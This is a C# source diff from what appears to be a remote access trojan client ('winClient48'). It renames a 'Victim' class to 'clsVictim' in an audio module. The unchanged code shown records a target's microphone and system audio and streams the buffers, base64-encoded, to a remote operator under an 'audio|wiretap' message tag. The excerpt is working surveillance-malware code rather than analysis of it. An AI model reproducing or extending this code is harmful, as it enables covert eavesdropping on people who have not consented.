@@ -19,7 +19,7 @@ namespace winClient48
 
         private WaveFormat wave_format;
 
-        public Victim v;
+        public clsVictim v;
 
         private List<Tuple<int, string>> mic_devices = new List<Tuple<int, string>>();
         private List<Tuple<int, string>> speaker_devices = new List<Tuple<int, string>>();
@@ -51,7 +51,7 @@ namespace winClient48
         private bool g_bMicRecord = false;
         private bool g_bSysRecord = false;
 
-        public MicAudio(Victim v, string mic_output, string sys_output)
+        public MicAudio(clsVictim v, string mic_output, string sys_output)
         {
             micMP3_output = mic_output;
             sysMP3_output = sys_output;
@@ -338,7 +338,7 @@ namespace winClient48
             return decibels;
         }
 
-        public void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded)
+        public void SendBuffer(clsVictim v, string type, byte[] buffer, int bytes_recorded)
         {
             v.encSend(2, 0, $"audio|wiretap|{type}|buffer|{Bytes_dB(buffer, bytes_recorded)}|" + Convert.ToBase64String(buffer));
 
@@ -380,10 +380,10 @@ namespace winClient48
         private WaveInEvent wave_in;
         public event EventHandler<AudioCaptureEventArgs> DataAvailable;
         private MicAudio micAudio;
-        public delegate void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded);
+        public delegate void SendBuffer(clsVictim v, string type, byte[] buffer, int bytes_recorded);
         private SendBuffer sendBuffer;
 
-        private Victim v;
+        private clsVictim v;
 
         private bool bDisposed = false;
 
@@ -407,7 +407,7 @@ namespace winClient48
             Dispose(false);
         }
 
-        public void Start(Victim v, SendBuffer sendBuffer)
+        public void Start(clsVictim v, SendBuffer sendBuffer)
         {
             this.v = v;
             this.sendBuffer = sendBuffer;
@@ -447,8 +447,8 @@ namespace winClient48
     {
         private WasapiLoopbackCapture wasApiCapture;
         private WaveFileWriter writer;
-        private Victim v;
-        public delegate void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded);
+        private clsVictim v;
+        public delegate void SendBuffer(clsVictim v, string type, byte[] buffer, int bytes_recorded);
         private SendBuffer sendBuffer;
 
         public event EventHandler<AudioCaptureEventArgs> DataAvailable;
@@ -477,7 +477,7 @@ namespace winClient48
             Dispose(false);
         }
 
-        public void Start(Victim v, int idx, SendBuffer sendBuffer)
+        public void Start(clsVictim v, int idx, SendBuffer sendBuffer)
         {
             this.v = v;
             this.sendBuffer = sendBuffer;
